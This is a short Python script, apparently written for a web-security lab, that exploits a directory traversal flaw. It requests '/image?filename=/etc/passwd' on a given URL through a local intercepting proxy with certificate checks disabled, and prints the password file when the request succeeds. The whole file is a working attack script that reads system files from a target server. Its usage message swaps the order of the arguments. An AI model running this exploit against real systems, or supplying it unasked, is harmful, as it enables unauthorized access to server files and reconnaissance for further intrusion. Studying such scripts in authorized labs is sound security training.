import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def directory_traversal_exploit(url):
    img_url = url + '/image?filename=/etc/passwd'
    r = requests.get(img_url,verify=False,proxies=proxies)
    if 'root:x' in r.text:
        print('✅ Exploit was successful!')
        print('✅ The following is the content of the etc/passwd file:')
        print(r.text)
    else:
        print('❌ Exploit failed')
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print('⚠️  Usage: <url> %s' % sys.argv[0])
        print('⚠️  Example www.example.com %s' % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    directory_traversal_exploit(url)

if __name__ == '__main__':
    main()